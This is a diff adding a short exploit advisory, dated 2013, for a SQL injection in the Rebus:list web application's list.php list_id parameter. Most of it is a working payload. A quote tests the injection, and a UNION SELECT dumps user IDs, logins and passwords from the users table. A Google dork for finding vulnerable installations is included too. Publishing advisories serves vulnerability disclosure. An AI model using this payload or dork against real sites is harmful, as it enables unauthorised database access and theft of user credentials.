@@ -1,0 +1,27 @@
+# Exploit Title: Rebus:list SQL Injection Vulnerability
+
+# Date: 3/18/2013
+
+# Vendor Homepage: http://www.ptfs-europe.com/products/rebus/rebuslist/
+ 
+# Author: Robert Cooper (robert.cooper [at] areyousecure.net)
+ 
+# Tested on: [Linux/Windows 7]
+ 
+#Vulnerable Parameters: list_id=
+
+# Google Dork: intext: Powered by rebus:list
+ 
+##############################################################
+Exploit:
+ 
+http://server/list.php?list_id=2'
+
+http://server/list.php?list_id=-2 union all select 1,2,group_concat(user_id,0x3a,login,0x3a,password) FROM users--
+ 
+
+##############################################################
+ 
+http://www.areyousecure.net
+ 
+# Shouts to the Belegit crew
